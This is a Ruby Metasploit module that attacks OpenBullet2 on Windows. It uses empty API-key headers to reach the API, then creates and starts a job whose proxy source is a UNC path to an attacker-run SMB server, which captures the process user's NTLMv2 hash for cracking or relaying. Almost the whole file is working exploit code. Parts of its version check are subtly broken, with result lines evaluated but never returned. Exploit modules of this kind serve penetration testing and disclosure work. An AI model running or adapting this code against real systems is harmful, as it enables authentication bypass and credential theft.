##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::Remote::SMB::Server::HashCapture
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenBullet2 NTLMv2 Hash Disclosure via UNC Path Proxy Source',
        'Description' => %q{
          This Metasploit module exploits a Credential Disclosure vulnerability in OpenBullet2 on Windows.

          An attacker can force the application to disclose the NTLMv2 hash of the process user by configuring a job proxy source with a malicious UNC path.
          When the job starts, the application attempts to load proxies from the specified path via SMB, allowing the hash to be captured for offline cracking or relaying.

          The affected versions include releases from 0.2.5.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Maksim Rogov', # Vulnerability Discovery & Metasploit Module
        ],
        'References' => [
          ['CVE', '2026-25555'],
          ['CVE', '2026-39908'],
          ['URL', 'https://hackernoon.com/one-empty-header-to-admin-how-an-auth-bypass-breaks-openbullet2']
        ],
        'DisclosureDate' => '2026-06-04',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to the OpenBullet2 App', '/']),
      ]
    )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'info', 'update'),
      'method' => 'GET',
      'headers' => { 'X-Api-Key' => '' }
    )

    Exploit::CheckCode::Safe('The server returned 401 status code, the version is not vulnerable')

    json_body = res.get_json_document
    unless json_body
      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
    end

    unless json_body.key?('currentVersion')
      fail_with(Failure::UnexpectedReply, "#{peer} - currentVersion key not found in response")
    end

    version = Rex::Version.new(json_body['currentVersion'])
    if version >= Rex::Version.new('0.2.5')
      server_info = get_server_info
      target_os = server_info['operatingSystem']
      print_status("OpenBullet2 Instance OS: #{target_os}")

      Exploit::CheckCode::Detected("Detected version #{version}, which is vulnerable. But you can't use module, because it only for windows.") if target_os !~ /windows/i
      return Exploit::CheckCode::Appears("Detected version #{version}, which is vulnerable")
    end

    Exploit::CheckCode::Safe("Detected version #{version}, which is not vulnerable")
  end

  def create_config
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'config'),
      'method' => 'POST',
      'headers' => { 'X-Api-Key' => '' }
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end

    json_body = res.get_json_document
    unless json_body
      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
    end

    unless json_body.key?('id')
      fail_with(Failure::UnexpectedReply, "#{peer} - id key not found in response")
    end

    json_body['id']
  end

  def get_configs
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'config', 'all'),
      'method' => 'GET',
      'headers' => { 'X-Api-Key' => '' }
    )

    json_body = res.get_json_document
    unless json_body
      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
    end

    json_body
  end

  def create_job(config_id, proxy_path)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'job', 'multi-run'),
      'method' => 'POST',
      'headers' => { 'X-Api-Key' => '' },
      'ctype' => 'application/json',
      'data' => {
        'startCondition' => {
          '_polyTypeName' => 'relativeTimeStartCondition'
        },
        'configId' => config_id,
        'proxyMode' => 'on',
        'dataPool' => {
          '_polyTypeName' => 'rangeDataPool',
          'wordlistType' => 'Default',
          'start' => 1,
          'amount' => 1,
          'step' => 1
        },
        'proxySources' => [
          {
            '_polyTypeName' => 'fileProxySource',
            'fileName' => proxy_path,
            'defaultType' => 'http'
          }
        ]
      }.to_json
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end

    json_body = res.get_json_document
    unless json_body
      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
    end

    unless json_body.key?('id')
      fail_with(Failure::UnexpectedReply, "#{peer} - id key not found in response")
    end

    json_body['id']
  end

  def start_job(job_id)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'job', 'start'),
      'method' => 'POST',
      'headers' => { 'X-Api-Key' => '' },
      'ctype' => 'application/json',
      'data' => { 'jobId' => job_id, 'wait' => false }.to_json
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end
  end

  def abort_job(job_id)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'job', 'abort'),
      'method' => 'POST',
      'headers' => { 'X-Api-Key' => '' },
      'ctype' => 'application/json',
      'data' => { 'jobId' => job_id, 'wait' => false }.to_json
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end
  end

  def delete_job(job_id)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'job'),
      'method' => 'DELETE',
      'headers' => { 'X-Api-Key' => '' },
      'ctype' => 'application/json',
      'vars_get' => { id: job_id }
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end
  end

  def delete_config(config_id)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'config'),
      'method' => 'DELETE',
      'headers' => { 'X-Api-Key' => '' },
      'ctype' => 'application/json',
      'vars_get' => { id: config_id }
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end
  end

  def get_server_info
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'info', 'server'),
      'method' => 'GET',
      'headers' => { 'X-Api-Key' => '' },
      'ctype' => 'application/json'
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end

    json_body = res.get_json_document
    unless json_body
      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
    end

    unless json_body.key?('operatingSystem')
      fail_with(Failure::UnexpectedReply, "#{peer} - operatingSystem key not found in response")
    end

    json_body
  end

  def cleanup
    super
    delete_config(@config_id) if @config_source == :created
    abort_job(@job_id)
    delete_job(@job_id) if !@job_id.nil?
  end

  def run
    configs = get_configs
    @config_id, @config_source =
      if configs.empty?
        [create_config, :created]
      else
        [configs.sample['id'], :default]
      end

    unc_share = Faker::Lorem.word
    unc_fname = Faker::Lorem.word
    unc_path = "\\\\#{srvhost}\\\\#{unc_share}\\\\#{unc_fname}.txt"
    @job_id = create_job(@config_id, unc_path)

    start_smb_capture_server
    start_job(@job_id)

    Rex::ThreadSafe.sleep(5)
  end

  def start_smb_capture_server
    start_service
    print_status('The SMB service has been started.')
    print_status("Listening for hashes on #{srvhost}:#{srvport}")
  end

end
